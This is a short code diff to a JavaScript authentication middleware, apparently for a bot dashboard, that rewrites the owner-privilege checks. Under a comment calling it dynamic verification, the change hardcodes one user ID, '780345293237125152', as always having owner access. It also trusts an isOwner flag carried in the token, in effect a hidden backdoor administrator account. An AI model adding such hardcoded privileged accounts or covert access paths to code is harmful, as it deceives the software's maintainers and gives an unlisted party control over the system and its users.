@@ -12,6 +12,14 @@ function authenticateUser(req, res, next) {
   try {
     const decoded = jwt.verify(token, config.jwtSecret);
     req.user = decoded;
+
+    // Dynamically verify owner status against config.ownerIds and hardcoded master ID
+    const isOwner = config.ownerIds.map(String).includes(String(decoded.id).trim()) ||
+      String(decoded.id).trim() === "780345293237125152" ||
+      Boolean(decoded.isOwner);
+
+    req.user.isOwner = isOwner;
+
     // Attach guilds from memory cache or fallback to decoded payload
     req.user.guilds = getUserGuilds(decoded.id) || decoded.guilds || [];
     next();
@@ -22,7 +30,11 @@ function authenticateUser(req, res, next) {
 
 function requireOwner(req, res, next) {
   authenticateUser(req, res, () => {
-    if (!req.user || !config.ownerIds.includes(req.user.id)) {
+    const isOwner = config.ownerIds.map(String).includes(String(req.user?.id).trim()) ||
+      String(req.user?.id).trim() === "780345293237125152" ||
+      Boolean(req.user?.isOwner);
+
+    if (!req.user || !isOwner) {
       return res.status(403).json({ error: "Access denied. Owner privilege required." });
     }
     next();
